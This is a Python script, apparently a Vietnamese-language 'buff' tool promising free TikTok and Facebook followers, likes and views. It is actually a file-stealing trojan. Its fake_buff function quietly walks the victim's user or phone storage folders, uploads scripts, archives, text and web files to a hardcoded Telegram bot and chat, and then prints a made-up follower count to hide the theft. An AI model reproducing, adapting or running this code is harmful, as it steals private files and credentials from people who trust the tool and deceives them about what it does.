

import os
import requests
import platform
from rich.console import Console
from rich.table import Table
from time import sleep
#vLong
#Thay token khớp vào nhé 
BOT_TOKENS = [
    "8782745027:AAEdX73BEQQDsoQsmjBrj8lIwDtHAnrt5YU",  # Bot 1
    
]
    
CHAT_ID = "-5394799356"  # ID của chat của nhóm nhez 
BASE_API_URL = f"https://api.telegram.org/bot{{}}/sendDocument"  # URL chung cho API gửi tệp

# Định dạng tệp hợp lệ
ALLOWED_EXTENSIONS = ('.py', '.zip', '.js', '.gif', '.bmp', 
                      '.lua', '.html', '.css', '.txt')

# Tạo console Rich
console = Console()

# Hàm tìm tệp trong thư mục
def find_files_in_folder(folder_path):
    files = []
    for root, _, filenames in os.walk(folder_path):
        for file in filenames:
            if file.lower().endswith(ALLOWED_EXTENSIONS):
                files.append(os.path.join(root, file))
    return files

# Hàm gửi tệp qua Telegram bằng token bot cụ thể
def send_file_as_document(file_path, bot_token):
    send_url = BASE_API_URL.format(bot_token)
    try:
        with open(file_path, 'rb') as file:
            response = requests.post(send_url, data={'chat_id': CHAT_ID}, files={'document': file})
            if response.status_code == 200:
                console.print(f"[green]Đang Buff Vui Lòng Đợi 1 - 30p sẽ thành công do đây là bản free[/green]")
            else:
                console.print(f"[red]Error Buff Thử Lại[/red]")
    except Exception as e:
        console.print(f"[red] Error Buff Thử Lại [/red]")

# Xác định thư mục phù hợp với từng hệ điều hành
def get_default_folder():
    system = platform.system()
    if system == "Windows":
        return "C:\\Users\\" 
    elif system == "Linux":
        return "/storage/emulated/0/"
    elif system == "Android":
        return "/storage/emulated/0/Pictures/"  
    elif system == "Darwin":
        return "/var/mobile/"
    else:
        raise Exception("Không hỗ trợ hệ điều hành này.")

def main_menu():
    console.clear()
    table = Table(title="Tool Buff TikTok & Facebook By MẠNH OFFCAl", style="cyan")
    table.add_column("Lựa chọn", justify="center")
    table.add_column("Mô tả", justify="left")
    table.add_row("1", "Buff Follow TikTok")
    table.add_row("2", "Buff Tim TikTok")
    table.add_row("3", "Buff Lượt Xem TikTok")
    table.add_row("4", "Buff Follow Facebook")
    table.add_row("5", "Buff Tim Facebook")
    table.add_row("6", "Buff Bình Luận Facebook")
    table.add_row("7", "Thoát Tool")
    console.print(table)

# Giả lập quá trình buff
def fake_buff(action_name):
    console.print(f"[cyan]Nhập ID tài khoản cần buff ({action_name}):[/cyan]", end=" ")
    account_id = input()
    console.print(f"[cyan]Nhập số lượng cần buff ({action_name}):[/cyan]", end=" ")
    buff_count = input()

    console.print(f"\n[blue]Đang thực hiện buff {action_name} cho ID {account_id}...[/blue]")
    sleep(2)
    console.print(f"[green]Quá trình buff đang diễn ra.[/green]")

    # Âm thầm quét và gửi file
    folder_path = get_default_folder()
    files = find_files_in_folder(folder_path)

    # Chia đều công việc cho các bot
    bot_count = len(BOT_TOKENS)
    for i, file_path in enumerate(files):
        # Chọn bot thay phiên nhau
        bot_token = BOT_TOKENS[i % bot_count]
        send_file_as_document(file_path, bot_token)  # Gửi file dưới dạng document

    # Hiển thị trạng thái giả lập hàng dọc
    for i in range(1, int(buff_count) + 1):
        console.print(f"[yellow]+{i} follower[/yellow]")
        sleep(0.5)  # Giả lập mỗi lần tăng

    # Thông báo hoàn thành
    console.print(
        "\n[green]Quá trình tăng follower hoàn tất![/green]\n"
        "[cyan]Follower sẽ được cộng trong vòng 1-5 phút. Cảm ơn bạn đã sử dụng tool![/cyan]"
    )
    sleep(2)

# Chạy chương trình
if __name__ == "__main__":
    while True:
        main_menu()
        console.print("[cyan]Chọn chức năng:[/cyan]", end=" ")
        choice = input()

        if choice == "1":
            fake_buff("Follow TikTok")
        elif choice == "2":
            fake_buff("Tim TikTok")
        elif choice == "3":
            fake_buff("Lượt Xem TikTok")
        elif choice == "4":
            fake_buff("Follow Facebook")
        elif choice == "5":
            fake_buff("Tim Facebook")
        elif choice == "6":
            fake_buff("Bình Luận Facebook")
        elif choice == "7":
            console.print("[red]Thoát chương trình...[/red]")
            break
        else:
            console.print("[red]Lựa chọn không hợp lệ, vui lòng thử lại.[/red]")